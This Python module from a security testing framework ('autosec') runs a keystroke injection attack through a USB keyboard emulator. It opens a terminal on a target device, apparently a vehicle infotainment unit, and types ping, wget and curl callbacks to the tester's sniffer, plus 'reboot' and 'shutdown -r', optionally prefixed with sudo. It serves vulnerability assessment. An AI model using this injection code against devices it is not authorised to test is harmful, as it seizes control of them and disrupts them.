"""
Keystroke injection attack module
"""
import logging
import time
from typing import Any, Type, Union

from autosec.core import UserInteraction
from autosec.core.autosec_module import AutosecModule, AutosecExpectedMetrics, AutosecModuleInformation
from autosec.core.commandLineInteraction import CommandLineInteraction
from autosec.core.ressources import InternetInterface, COMPort, AutosecRessource, KeystrokeInjectionResult
from utils.arduino import KeystrokeProtocol
from utils.sniffer import PingSniffer, HttpSniffer

__author__: str = "Michael Weichenrieder"


class KeystrokeInjectionAttack(AutosecModule):
    """
    Keystroke injection attack module
    """

    # Http sniffer port
    _http_sniffer_port: int = 8081

    # Payload array with lambda to build command (with ip and port parameters) and success question
    _payloads: [(Any, str)] = [
        (lambda ip, port: "ping -c 5 " + ip,
         "Was a PING request received? (message here in console)"),
        (lambda ip, port: "wget -qO- " + ip + ":" + str(port),
         "Was a WGET request received? (message here in console)"),
        (lambda ip, port: "curl " + ip + ":" + str(port),
         "Was a CURL request received? (message here in console)"),
        (lambda ip, port: "gnome-terminal",
         "Was a terminal window visibly opened on target device?"),
        (lambda ip, port: "reboot",
         "Did the target device show a sign of reboot? (could take 1-2 minutes)"),
        (lambda ip, port: "shutdown -r",
         "Did the target device show a sign of reboot? (could take 1-2 minutes)")
    ]

    def __init__(self):
        """
        Initialize logger in constructor
        """
        super().__init__()
        self._logger = logging.getLogger("autosec.modules.infotainment_attacks.keystroke_injection_attack")
        self._logger.setLevel(logging.INFO)

    @classmethod
    def action_cancel_command(cls, keystroke_protocol: KeystrokeProtocol) -> bool:
        """
        Tries to cancel a command with ctrl+c

        :param keystroke_protocol: The keystroke protocol
        :return True for success, else false
        """
        return False not in [keystroke_protocol.press_key(KeystrokeProtocol.KEY_LEFT_CTRL),
                             keystroke_protocol.write_key(ord("c")),
                             keystroke_protocol.release_key(KeystrokeProtocol.KEY_LEFT_CTRL)]

    @classmethod
    def action_open_shell(cls, keystroke_protocol: KeystrokeProtocol) -> bool:
        """
        Tries to open a shell on the target system (wait a short delay for opening)

        :param keystroke_protocol: The keystroke protocol
        :return True for success, else false
        """
        suc: bool = False not in [keystroke_protocol.press_key(KeystrokeProtocol.KEY_LEFT_CTRL),
                                  keystroke_protocol.press_key(KeystrokeProtocol.KEY_LEFT_ALT),
                                  keystroke_protocol.write_key(ord("t")),
                                  keystroke_protocol.release_key(KeystrokeProtocol.KEY_LEFT_ALT),
                                  keystroke_protocol.release_key(KeystrokeProtocol.KEY_LEFT_CTRL)]
        time.sleep(1)
        return suc

    @classmethod
    def action_prepend_sudo(cls, keystroke_protocol: KeystrokeProtocol) -> bool:
        """
        Prints a "sudo " prefix

        :param keystroke_protocol: The keystroke protocol
        :return: True for success, else false
        """
        return keystroke_protocol.send_keystrokes("sudo ")

    def get_info(self) -> AutosecModuleInformation:
        """
        :return: Basic info of the module
        """
        return AutosecModuleInformation(
            name=type(self).__name__,
            description="Checks a target for keystroke injection vulnerabilities",
            dependencies=["pyserial", "scapy"],
            tags=["usb", "keystroke", "hid"]
        )

    def get_produced_outputs(self) -> [AutosecRessource]:
        """
        :return: Output resource examples
        """
        return [
            KeystrokeInjectionResult(
                keyboard_layout=KeystrokeProtocol.LAYOUT_DE,
                injected_command="curl 192.168.90.125:8081",
                success=True
            ),
            KeystrokeInjectionResult(
                keyboard_layout=KeystrokeProtocol.LAYOUT_DE,
                injected_command="sudo curl 192.168.90.125:8081",
                success=False
            ),
            KeystrokeInjectionResult(
                keyboard_layout=KeystrokeProtocol.LAYOUT_EN,
                injected_command="curl 192.168.90.125:8081",
                success=True
            ),
            KeystrokeInjectionResult(
                keyboard_layout=KeystrokeProtocol.LAYOUT_EN,
                injected_command="sudo curl 192.168.90.125:8081",
                success=False
            )
        ]

    def get_required_ressources(self) -> [AutosecRessource]:
        """
        :return: Required input resource example
        """
        return [
            COMPort(
                port="COM6"
            ),
            InternetInterface(
                interface="eth0",
                ipv4_address="192.168.90.125",
                subnet_length=16
            )
        ]

    def can_run(self, inputs: [AutosecRessource]) -> Union[bool, AutosecExpectedMetrics]:
        """
        :return: If the attack can run and metrics if it can
        """
        if super().can_run(inputs):
            internet_interface: InternetInterface = self.get_ressource(inputs, Type[InternetInterface])
            try:
                internet_interface.get_scapy_interface()
                return AutosecExpectedMetrics(
                    can_run=True,
                    # Based on user interaction time (guess: 30 seconds)
                    expected_runtime=len(self._payloads) * 2 * 2 * 30,
                    expected_success=.5  # Pretty unsure, not enough data
                )
            except Exception:
                # Scapy interface not present
                return False
        return False

    def run(self, inputs: [AutosecRessource]) -> [AutosecRessource]:
        """
        Run the attack

        :param inputs: The inputs (COMPort, InternetInterface)
        :return: The results (KeystrokeInjectionResult)
        """
        # Get com port and internet interface from input resources
        com_port: COMPort = self.get_ressource(inputs, Type[COMPort])
        internet_interface: InternetInterface = self.get_ressource(inputs, Type[InternetInterface])

        # Init serial connection and interaction
        keystroke_protocol = KeystrokeProtocol(port=com_port.get_port())
        user_interaction: UserInteraction = CommandLineInteraction()

        # Start ping and http sniffer
        ping_sniffer: PingSniffer = PingSniffer(internet_interface, user_interaction)
        http_sniffer: HttpSniffer = HttpSniffer(self._http_sniffer_port, user_interaction)

        # Prepare results data
        results: [KeystrokeInjectionResult] = []
        vulnerabilities: int = 0

        # Repeat for every layout
        payload_count: int = len(self._payloads) * 2 * 2
        payload_counter: int = 0
        for layout in [KeystrokeProtocol.LAYOUT_DE, KeystrokeProtocol.LAYOUT_EN]:
            # Set layout
            if not keystroke_protocol.set_layout(layout):
                raise Exception("Serial failed to respond correctly")

            # Test all prefixes
            for sudo in [True, False]:
                # Test all payloads
                for function, question in self._payloads:
                    # Try to open fresh terminal
                    if False in [self.action_cancel_command(keystroke_protocol),
                                 self.action_open_shell(keystroke_protocol)]:
                        raise Exception("Serial failed to respond correctly")

                    # Run payload with prefix
                    command = f"{'sudo ' if sudo else ''}" \
                              f"{function(internet_interface.get_ipv4_address(), self._http_sniffer_port)}"
                    if False in [keystroke_protocol.send_keystrokes(command),
                                 keystroke_protocol.write_key(keystroke_protocol.KEY_RETURN)]:
                        raise Exception("Serial failed to respond correctly")
                    payload_counter += 1

                    # Display stats
                    user_interaction.feedback(f"Payload {payload_counter}/{payload_count} executed:\n"
                                              f"- Command: {command}\n"
                                              f"- Layout: {layout}")

                    # Request success from user
                    user_interaction.setQuestion(f"- {question} (1) yes, (2) no, (3) skip")
                    success: int = user_interaction.integerAnswer()
                    if success in [1, 2]:
                        if success == 1:
                            vulnerabilities += 1
                            self._logger.warning(
                                f'Keystroke injection "{command}" revealed a vulnerability via layout "{layout}"')
                        results.append(
                            KeystrokeInjectionResult(
                                keyboard_layout=layout,
                                injected_command=command,
                                success=True if success == 1 else False)
                        )
                    print()

        # Stop sniffers
        http_sniffer.stop()
        ping_sniffer.stop()

        # Return results
        self._logger.info(f"Keystroke injection attack done. Successful keystroke injection tests: {vulnerabilities}")
        return results
